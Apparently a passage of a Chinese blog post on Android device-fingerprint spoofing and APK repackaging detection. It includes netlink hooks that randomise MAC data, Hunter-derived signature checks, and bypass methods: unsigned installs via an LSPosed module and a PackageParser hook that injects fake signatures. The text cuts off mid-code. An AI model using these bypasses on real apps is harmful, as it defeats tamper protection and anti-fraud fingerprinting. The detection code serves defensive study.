(rta-&gt;rta_type == IFLA_IFNAME) &#123;</span><br><span class="line">                if (RTA_PAYLOAD(rta) &lt; sizeof(new_addr.name)) &#123;</span><br><span class="line">                    memcpy(new_addr.name, RTA_DATA(rta), RTA_PAYLOAD(rta));</span><br><span class="line">                    new_addr.ifa.ifa_name = new_addr.name;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rta = RTA_NEXT(rta, rta_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (hdr-&gt;nlmsg_type == RTM_NEWADDR) &#123;  // IP 地址</span><br><span class="line">        //这个类型在获取网卡的时候未发现调用</span><br><span class="line">        auto *msg = reinterpret_cast&lt;ifaddrmsg *&gt;(NLMSG_DATA(hdr));</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        // We should already know about this from an RTM_NEWLINK message.</span><br><span class="line">        const auto *addr = reinterpret_cast&lt;const ifaddrs_storage *&gt;(*out);</span><br><span class="line"> </span><br><span class="line">        while (addr != nullptr &amp;&amp; addr-&gt;interface_index != static_cast&lt;int&gt;(msg-&gt;ifa_index)) &#123;</span><br><span class="line">            //LOGE(&quot;Current interface index: %d&quot;, addr-&gt;interface_index); // 添加当前接口索引日志</span><br><span class="line">            addr = reinterpret_cast&lt;const ifaddrs_storage *&gt;(addr-&gt;ifa.ifa_next);</span><br><span class="line">        &#125;</span><br><span class="line">        // If this is an unknown interface,</span><br><span class="line">        // ignore whatever we&#x27;re being told about it.</span><br><span class="line">        if (addr == nullptr) &#123;</span><br><span class="line">            //LOGE (&quot;_getifaddrs_callback RTM_NEWADDR return&quot;)</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        ifaddrs_storage new_addr(out);</span><br><span class="line">        strcpy(new_addr.name, addr-&gt;name);</span><br><span class="line">        new_addr.ifa.ifa_name = new_addr.name;</span><br><span class="line">        new_addr.ifa.ifa_flags = addr-&gt;ifa.ifa_flags;</span><br><span class="line">        new_addr.interface_index = addr-&gt;interface_index;</span><br><span class="line">        // Go through the various bits of information and find the address</span><br><span class="line">        // and any broadcast/destination address.</span><br><span class="line">        rtattr *rta = IFA_RTA(msg);</span><br><span class="line">        size_t rta_len = IFA_PAYLOAD(hdr);</span><br><span class="line">        while (RTA_OK(rta, rta_len)) &#123;</span><br><span class="line">            LOGE(&quot;RTA type: %d&quot;, rta-&gt;rta_type);</span><br><span class="line">            if (rta-&gt;rta_type == IFA_ADDRESS) &#123;</span><br><span class="line">                //LOGE (&quot;_getifaddrs_callback RTM_NEWADDR IFA_ADDRESS %d &quot;,msg-&gt;ifa_family)</span><br><span class="line">                if (msg-&gt;ifa_family == AF_INET || msg-&gt;ifa_family == AF_INET6) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    // 确保 RTA_DATA(rta) 的大小是正确的</span><br><span class="line">                    if (msg-&gt;ifa_family == AF_INET6 &amp;&amp; RTA_PAYLOAD(rta) &lt; sizeof(struct in6_addr)) &#123;</span><br><span class="line">                        LOGE(&quot;RTA_PAYLOAD size is less than sizeof(struct in6_addr)&quot;);</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    struct in6_addr addr_v6_address&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr_v6_address, RTA_DATA(rta), sizeof(struct in6_addr));</span><br><span class="line">                    char str[INET6_ADDRSTRLEN];</span><br><span class="line">                    inet_ntop(AF_INET6, &amp;addr_v6_address, str, sizeof(str));</span><br><span class="line">                    LOGE(&quot;RTM_NEWADDR&amp;IFA_ADDRESS&amp;AF_INET6 111 %s&quot;, str)</span><br><span class="line"> </span><br><span class="line">                    size_t byteCount = RTA_PAYLOAD(rta);</span><br><span class="line">                    LOGE (&quot;RTM_NEWADDR&amp;IFA_ADDRESS %zu  %s &quot;,</span><br><span class="line">                          byteCount, getpData(data, byteCount).c_str())</span><br><span class="line">                    new_addr.SetAddress(msg-&gt;ifa_family, data, byteCount);</span><br><span class="line">                    new_addr.SetNetmask(msg-&gt;ifa_family, msg-&gt;ifa_prefixlen);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (rta-&gt;rta_type == IFA_BROADCAST) &#123;</span><br><span class="line">                if (msg-&gt;ifa_family == AF_INET||msg-&gt;ifa_family == AF_INET6) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    size_t byteCount = RTA_PAYLOAD(rta);</span><br><span class="line">                    LOGE (&quot;RTM_NEWADDR&amp;IFA_BROADCAST %zu  %s &quot;,</span><br><span class="line">                          byteCount, getpData(data, byteCount).c_str())</span><br><span class="line">                    new_addr.SetBroadcastAddress(msg-&gt;ifa_family, data,</span><br><span class="line">                                                 byteCount);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (rta-&gt;rta_type == IFA_LOCAL) &#123;</span><br><span class="line">                //LOGE (&quot;_getifaddrs_callback RTM_NEWADDR IFA_LOCAL %d &quot;,msg-&gt;ifa_family)</span><br><span class="line">                if (msg-&gt;ifa_family == AF_INET || msg-&gt;ifa_family == AF_INET6) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    struct in6_addr addr_v6_local&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr_v6_local, RTA_DATA(rta), sizeof(struct in6_addr));</span><br><span class="line">                    char str[INET6_ADDRSTRLEN];</span><br><span class="line">                    inet_ntop(AF_INET6, &amp;addr_v6_local, str, sizeof(str));</span><br><span class="line">                    LOGE(&quot;RTM_NEWADDR&amp;IFA_ADDRESS&amp;AF_INET6 222 %s&quot;, str)</span><br><span class="line"> </span><br><span class="line">                    size_t byteCount = RTA_PAYLOAD(rta);</span><br><span class="line">                    LOGE (&quot;RTM_NEWADDR&amp;IFA_LOCAL %zu  %s &quot;,</span><br><span class="line">                          byteCount, getpData(data, byteCount).c_str())</span><br><span class="line">                    new_addr.SetLocalAddress(msg-&gt;ifa_family, data, byteCount);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rta = RTA_NEXT(rta, rta_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (hdr-&gt;nlmsg_type == RTM_NEWNEIGH) &#123; // 拦截和修改邻居缓存信息</span><br><span class="line">        // RTM_NEWNEIGH 类型消息为网上邻居(arp表)，需要进行随机化</span><br><span class="line">        auto *ifinfo = reinterpret_cast&lt;ndmsg *&gt;(NLMSG_DATA(hdr));</span><br><span class="line">        rtattr *rta = NDA_RTA(ifinfo);</span><br><span class="line">        size_t rta_len = NDA_PAYLOAD(hdr);</span><br><span class="line"> </span><br><span class="line">        int if_index = ifinfo-&gt;ndm_ifindex;</span><br><span class="line">        char if_name[IFNAMSIZ];</span><br><span class="line">        if_indextoname(if_index, if_name);</span><br><span class="line">        //遍历具体的消息类型</span><br><span class="line">        while (RTA_OK(rta, rta_len)) &#123;</span><br><span class="line">            //a neighbor cache n/w layer destination address</span><br><span class="line">            //邻居缓存nw层目标地址,ip地址区分32和64</span><br><span class="line">            //ip地址,ip可以是v4也可以是v6</span><br><span class="line">            if (rta-&gt;rta_type == NDA_DST) &#123;</span><br><span class="line">                if (ifinfo-&gt;ndm_family == AF_INET) &#123;</span><br><span class="line">                    //32</span><br><span class="line">                    struct in_addr addr&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr, RTA_DATA(rta), sizeof(struct in_addr));</span><br><span class="line">                    char *ntoa = inet_ntoa(addr);</span><br><span class="line">                    //LOGE(&quot;NDA_DST&amp;AF_INET   %s&quot;, inet_ntoa(addr))</span><br><span class="line">                &#125; else if (ifinfo-&gt;ndm_family == AF_INET6) &#123;</span><br><span class="line">                    //64</span><br><span class="line">                    struct in6_addr addr&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr, RTA_DATA(rta), sizeof(struct in6_addr));</span><br><span class="line">                    char str[INET6_ADDRSTRLEN];</span><br><span class="line">                    inet_ntop(AF_INET6, &amp;addr, str, sizeof(str));</span><br><span class="line">                    //LOGE(&quot;NDA_DST&amp;AF_INET6  %s&quot;, str);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else if (rta-&gt;rta_type == NDA_LLADDR) &#123;</span><br><span class="line">                //网卡地址</span><br><span class="line">                auto *data = RTA_DATA(rta);</span><br><span class="line">                setMacInData(data, if_name, ZHENXI_RUNTIME_NETLINK_NEIGH, true);</span><br><span class="line">            &#125;</span><br><span class="line">            rta = RTA_NEXT(rta, rta_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (hdr-&gt;nlmsg_type == RTM_GETADDR) &#123; // 处理对 RTM_GETADDR 请求的响应</span><br><span class="line">        //LOGE(&quot;RTM_GETADDR &quot;)</span><br><span class="line">        auto *ifa = reinterpret_cast&lt;ifaddrmsg *&gt;(NLMSG_DATA(hdr));</span><br><span class="line"> </span><br><span class="line">        // Get the interface name</span><br><span class="line">        char ifname[IFNAMSIZ];</span><br><span class="line">        if_indextoname(ifa-&gt;ifa_index, ifname);</span><br><span class="line"> </span><br><span class="line">        // Process the attributes</span><br><span class="line">        rtattr *rta = IFA_RTA(ifa);</span><br><span class="line">        size_t rta_len = IFA_PAYLOAD(hdr);</span><br><span class="line">        while (RTA_OK(rta, rta_len)) &#123;</span><br><span class="line">            if (rta-&gt;rta_type == IFA_ADDRESS) &#123;</span><br><span class="line">                if (ifa-&gt;ifa_family == AF_INET6) &#123;</span><br><span class="line">                    // Ensure RTA_DATA(rta) size is correct</span><br><span class="line">                    if (RTA_PAYLOAD(rta) &lt; sizeof(struct in6_addr)) &#123;</span><br><span class="line">                        LOGE(&quot;RTM_GETADDR RTA_PAYLOAD size is less than sizeof(struct in6_addr)&quot;);</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    struct in6_addr addr_v6_address&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr_v6_address, RTA_DATA(rta), sizeof(struct in6_addr));</span><br><span class="line">                    char str[INET6_ADDRSTRLEN];</span><br><span class="line">                    inet_ntop(AF_INET6, &amp;addr_v6_address, str, sizeof(str));</span><br><span class="line">                    LOGE(&quot;RTM_GETADDR RTM_GETADDR&amp;IFA_ADDRESS&amp;AF_INET6 %s&quot;, str);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rta = RTA_NEXT(rta, rta_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h3><p>设个设备指纹也是很核心的设备指纹 ，这个玩意<strong>底层获取也是netlink</strong>，但是netlink获取，这块处理很不好处理 </p><p>常用的获取方式比如，Java获取，命令获取。如果需要进行替换的话，只需要处理命令行和Java Hook即可 </p><p><strong>命令行可以在对方执行命令之前，将命令换成cat命令，去cat自己提前Mock好的文件，效果是一样的 。</strong></p><p>当然，还有另一种思路，其实这个字段可以服务端获取，客户端二次上报，进行匹配 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 1. 声明变量</span><br><span class="line">    NetworkInterface networkInterface;</span><br><span class="line">    InetAddress inetAddress;</span><br><span class="line"></span><br><span class="line">    // 2. 外层循环：遍历所有网络接口</span><br><span class="line">    for (Enumeration&lt;NetworkInterface&gt; en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) &#123;</span><br><span class="line">        // 3. 获取当前网络接口</span><br><span class="line">        networkInterface = en.nextElement();</span><br><span class="line"></span><br><span class="line">        // 4. 内层循环：遍历当前接口上的所有 IP 地址</span><br><span class="line">        for (Enumeration&lt;InetAddress&gt; enumIpAddr = networkInterface.getInetAddresses(); enumIpAddr.hasMoreElements(); ) &#123;</span><br><span class="line">            // 5. 获取当前 IP 地址</span><br><span class="line">            inetAddress = enumIpAddr.nextElement();</span><br><span class="line"></span><br><span class="line">            // 6. 判断是否为 IPv6 地址</span><br><span class="line">            if (inetAddress instanceof Inet6Address) &#123;</span><br><span class="line">                // 7. 如果是，则打印该地址</span><br><span class="line">                CLog.e(&quot;Java 获取 ipv6 &quot; + inetAddress.getHostAddress());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Throwable ex) &#123;</span><br><span class="line">    // 8. 异常处理</span><br><span class="line">    CLog.e(&quot;printf ipv6 info error &quot; + ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>遍历当前设备上所有的网络接口（Network Interface），找出并打印出与这些接口关联的所有 IPv6 地址</strong></p><p>命令行获取如下，ip命令获取如下 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ip -6 addr show</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 state UNKNOWN qlen 1000</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: dummy0: &lt;BROADCAST,NOARP,UP,LOWER_UP&gt; mtu 1500 state UNKNOWN qlen 1000</span><br><span class="line">    inet6 fe80::b86c:79ff:fe96:4945/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: rmnet_data0@rmnet_ipa0: &lt;UP,LOWER_UP&gt; mtu 1500 state UNKNOWN qlen 1000</span><br><span class="line">    inet6 fe80::2ad1:b5a0:792b:9ec4/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">30: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 state UP qlen 3000</span><br><span class="line">    inet6 fe80::8670:a04c:b8cf:467c/64 scope link stable-privacy</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><h3 id="系统内核信息"><a href="#系统内核信息" class="headerlink" title="系统内核信息"></a>系统内核信息</h3><p>这玩意底层走的都是uname函数 ，直接对<code>uname</code>系统调用处理即可 。获取方法比如，也可以直接svc调用uname函数 ，也可以直接根据命令行 ，</p><p>修改的话也很简单，直接在uname的after里面直接对数据进行替换即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><h3 id="包名随机路径"><a href="#包名随机路径" class="headerlink" title="包名随机路径"></a>包名随机路径</h3><p><strong>这个是一个非常非常核心的字段，就是&#x2F;data&#x2F;app&#x2F;随机Base64路径&#x2F;base.apk</strong></p><p><strong>这个随机路径就是设备指纹，比如一些大厂会玩，读取你微信的随机路径，获取微信的包信息，然后获取里面的随机路径</strong></p><p><strong>比如微信，快手，京东，淘宝这种随机路径 ，作为核心的唯一设备指纹，只要你不卸载微信，或者其他大厂apk ，你的设备指纹永远不发生变化，无论你如何修改他自己Apk里面的信息，跟他都不产生任何影响 。</strong></p><h3 id="系统账号"><a href="#系统账号" class="headerlink" title="系统账号"></a>系统账号</h3><p>一般尝试比如小米之类的，登入了指定账号，可以得到一个账号的<code>id</code>信息 ，这个也需要处理一下 。最好的办法是不登入账号 。</p><h2 id="环境检测"><a href="#环境检测" class="headerlink" title="环境检测"></a>环境检测</h2><p>检测环境大多数围绕Hunter的源码检测思路去复现 ，很多都是Hunter的源码 ，很多也都是行业内没有公开的一些检测思路</p><h3 id="Apk签名"><a href="#Apk签名" class="headerlink" title="Apk签名"></a>Apk签名</h3><p>提到环境检测不得不说的就是<strong>Apk重打包检测</strong> ，现在检测方法千奇百怪，我这边也是一一罗列一下，把一些可能存在的风险点，检测和绕过的原理详细叙述一下 。</p><p><strong>想要绕过签名检测最好的办法或者说成本最低有效的办法就是修改完毕以后不签名配合核心破解直接安装。</strong></p><blockquote><p>核心破解是<code>lsp</code>的模块，<code>lsp</code>商店直接下载，<code>Hook apk</code>的系统签名解析方法，直接绕过签名检测流程 ，已实现不签名直接安装</p></blockquote><p>首先先说一下大厂或者一些企业壳的检测点，Java层基础的获取签名的方法这块就不一一叙述了 。</p><h4 id="Native层获取签名方法"><a href="#Native层获取签名方法" class="headerlink" title="Native层获取签名方法"></a>Native层获取签名方法</h4><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>这块以<code>Hunter</code>源码开始介绍 </p><p>核心就三部分 。</p><ul><li><code>svc openat</code>读apk，去解析签名 。</li><li>检测打开的fd，对fd的路径进行反查，这块有个细节 <code>buff[len] = &#39;\0&#39;</code>; 就是加这个，如果攻击者没修改<code>readlinkat</code>的返回值，就可以检测出来 。</li><li>检测完毕路径以后<strong>对这个文件的权限进行反查</strong>，正常apk是在系统下的，<strong>权限GID和UID应该是1000</strong> ，如果攻击者忘记修改权限也可以检测出来 。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">const char *path = getApkPath(env, context); // 获取绝对路径 </span><br><span class="line">//check svc apk sign</span><br><span class="line">const string &amp;string = checkSign(env, path).substr(0, 10); // 截取签名哈希值的前10个字符</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;apk sign  &quot; &lt;&lt; string;</span><br><span class="line">if (string == Base64Utils::VTDecode(&quot;TFtCRU58UERAUQ==&quot;)) &#123; // Base64变体</span><br><span class="line">    //check sign success,but maybe svc io hook</span><br><span class="line">    //check apk path</span><br><span class="line">    int fd = my_openat(AT_FDCWD, reinterpret_cast&lt;const char *&gt;(path),</span><br><span class="line">                       O_RDONLY | O_CLOEXEC,</span><br><span class="line">                       0640);</span><br><span class="line">    //check apk path</span><br><span class="line">    char buff[PATH_MAX] = &#123;0&#125;;</span><br><span class="line">    std::string fdPath(&quot;/proc/&quot;);</span><br><span class="line">    fdPath.append(to_string(getpid())).append(&quot;/fd/&quot;).append(to_string(fd));</span><br><span class="line">    long len = raw_syscall(__NR_readlinkat, AT_FDCWD, fdPath.c_str(), buff, PATH_MAX);</span><br><span class="line">    if (len &lt; 0) &#123;</span><br><span class="line">        return getItemData(env, &quot;APK签名验证失败&quot;,</span><br><span class="line">                           &quot;readlinkat error&quot;, true,</span><br><span class="line">                           RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line">    &#125;</span><br><span class="line">    //截断,如果攻击者hook了readlinkat,只修改了参数,没修改返回值也可以检测出来。</span><br><span class="line">    buff[len] = &#x27;\0&#x27;;</span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;check apk sign path &quot; &lt;&lt; buff;</span><br><span class="line">    if (my_strcmp(path, buff) == 0) &#123;</span><br><span class="line">        LOG(INFO) &lt;&lt; &quot;check apk sign path success &quot;;</span><br><span class="line">        //start check memory&amp;location inode</span><br><span class="line">        struct stat statBuff = &#123;0&#125;;</span><br><span class="line">        long stat = raw_syscall(__NR_fstat, fd, &amp;statBuff);</span><br><span class="line">        if (stat &lt; 0) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;check apk sign path fail __NR_fstat&lt;0&quot;;</span><br><span class="line">            return getItemData(env, &quot;APK签名验证失败&quot;,</span><br><span class="line">                               &quot;fstat error&quot;, true, RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        //check uid&amp;gid (1000 = system group)</span><br><span class="line">        if (statBuff.st_uid != 1000 &amp;&amp; statBuff.st_gid != 1000) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;check apk sign gid&amp;uid fail &quot;;</span><br><span class="line">            return getItemData(env, &quot;APK签名验证失败&quot;,</span><br><span class="line">                               nullptr, true, RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        size_t inode = getFileInMapsInode(path);</span><br><span class="line">        if (statBuff.st_ino != inode) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;check apk sign inode fail &quot;&lt;&lt;statBuff.st_ino&lt;&lt;&quot; maps -&gt;&quot;&lt;&lt;inode;</span><br><span class="line">            return getItemData(env, &quot;APK签名验证失败&quot;,</span><br><span class="line">                               nullptr, true, RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; check apk sign success! uid-&gt; &quot; &lt;&lt; statBuff.st_uid</span><br><span class="line">                   &lt;&lt; &quot; gid-&gt; &quot;</span><br><span class="line">                   &lt;&lt; statBuff.st_gid;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;check apk sign path fail &quot;;</span><br><span class="line">        return getItemData(env, &quot;APK签名验证失败&quot;,</span><br><span class="line">                           nullptr, true, RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;check apk sign success&quot;;</span><br><span class="line"> </span><br><span class="line">    return nullptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Inode 校验检测的不是内存中的<strong>内容</strong>是否被修改，而是检测内存的<strong>来源</strong>是否被偷换</p></blockquote><h4 id="对抗"><a href="#对抗" class="headerlink" title="对抗"></a>对抗</h4><p>针对上面的检测对抗也很简单，对svc的<code>openat</code>拦截了以后，对<code>readlinkat</code>和<code>stat</code>函数进行处理即可。很轻松即可绕过检测。很多加壳基本都是检测<code>ROOT</code>检测<code>LSP</code>调用栈之类的，并不只是单一的去检测签名一个纬度。比如发现了开启了<code>seccomp</code>就会闪退，发现<code>Root</code>就会闪退。</p><h4 id="Java层获取签名方法"><a href="#Java层获取签名方法" class="headerlink" title="Java层获取签名方法"></a>Java层获取签名方法</h4><h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><h5 id="检测CREATOR是否被替换"><a href="#检测CREATOR是否被替换" class="headerlink" title="检测CREATOR是否被替换"></a>检测CREATOR是否被替换</h5><p>这里先说一下<code>Hunter</code>的<code>Java</code>层检测签名的方法，这块相当于反射<code>CREATOR</code> 变量，这个变量是保存一些<code>IPC</code>通讯的东西</p><p>很多攻击者会用<code>Lspatch</code>进行打包 ，对变量进行替换，这时候我们去检测这个变量的<code>Classloader</code>是不是系统<code>ClassLoader</code></p><p>防止被替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    Field creatorField = PackageInfo.class.getField(&quot;CREATOR&quot;);</span><br><span class="line">    creatorField.setAccessible(true);</span><br><span class="line">    Object creator = creatorField.get(null);</span><br><span class="line">    if (creator != null) &#123;</span><br><span class="line">        ClassLoader creatorClassloader = creator.getClass().getClassLoader();</span><br><span class="line">        ClassLoader sysClassloader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        if (creatorClassloader == null || sysClassloader == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        // 系统的是 bootclassloader</span><br><span class="line">        // 用户创建的都是 pathclassloader</span><br><span class="line">        // 如果相等则认为系统的被替换</span><br><span class="line">        if (sysClassloader.getClass().getName().</span><br><span class="line">                equals(creatorClassloader.getClass().getName())) &#123;</span><br><span class="line">            return new ListItemBean(&quot;Apk签名验证失败！&quot;,</span><br><span class="line">                    ListItemBean.RiskLeave.Deadly,</span><br><span class="line">                    &quot;Apk签名方法被替换!\n&quot;</span><br><span class="line">                            + creatorClassloader.getClass().getName() + &quot;\n&quot;</span><br><span class="line">                            + sysClassloader.getClass().getName());</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Throwable e) &#123;</span><br><span class="line">    CLog.e(&quot;checkApkPackageInfoCreator error &quot; + e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static final Creator&lt;PackageInfo&gt; CREATOR</span><br></pre></td></tr></table></figure><p><code>Creator&lt;PackageInfo&gt;</code>是说明这是一个用于创建<code>PackageInfo</code>类型对象的创建器</p></blockquote><p>我们之前分析<code>Java 层直接 通过binder和 AMS 通讯获取真实签名信息</code>这个的时候</p><p>我们是使用<code>getPackageInfo()</code>来获取签名的，如果通过Java反射找到<code>PackageInfo.CREATOR</code>这个静态字段，然后将这个字段的值替换成自己编写的恶意<code>Creator</code>实现，当App调用<code>getPackageInfo()</code>获取签名时，Android系统内部会使用这个被污染的<code>CREATOR</code>来创建<code>PackageInfo</code>对象，恶意<code>Creator</code>在创建对象时，将签名信息篡改为正版的签名，从而绕过App的签名校验</p><p>而这个检查的<strong>原理</strong>是：系统类的<code>Classloader</code>是<code>BootClassloader</code>，而我们呢通过Hook模块的代码是由App的<code>PathClassLoader</code>，因此只需要判断一下这个<code>Classloader</code>正不正确即可</p><h4 id="对抗-1"><a href="#对抗-1" class="headerlink" title="对抗"></a>对抗</h4><p>对抗的方法主要下面三种：</p><p>现在大厂一般会直接通过IPC直接和PMS进行通讯 ，不过这种思路也很好过 ，我这边也是参考的<code>Lspatch</code> </p><p>这块有两个很核心的思路 ，就是拦截<code>Binder IPC</code>通讯的方法，和<code>Hook</code>服务端的签名解析方法 。代码如下：</p><h5 id="Hook服务端解析签名方法"><a href="#Hook服务端解析签名方法" class="headerlink" title="Hook服务端解析签名方法"></a>Hook服务端解析签名方法</h5><p>在系统进行签名解析的时候进行签名替换替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private static void hookPackageParser(Signature[] fakeSignature) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        RposedBridge.hookAllMethods(</span><br><span class="line">                RposedHelpers.findClass(&quot;android.content.pm.PackageParser&quot;, ClassLoader.getSystemClassLoader()),</span><br><span class="line">                &quot;generatePackageInfo&quot;, new RC_MethodHook() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    protected void afterHookedMethod(MethodHookParam param) &#123;</span><br><span class="line">                        PackageInfo packageInfo = (PackageInfo) param.getResult();</span><br><span class="line">                        if (packageInfo == null) return;</span><br><span class="line">                        if 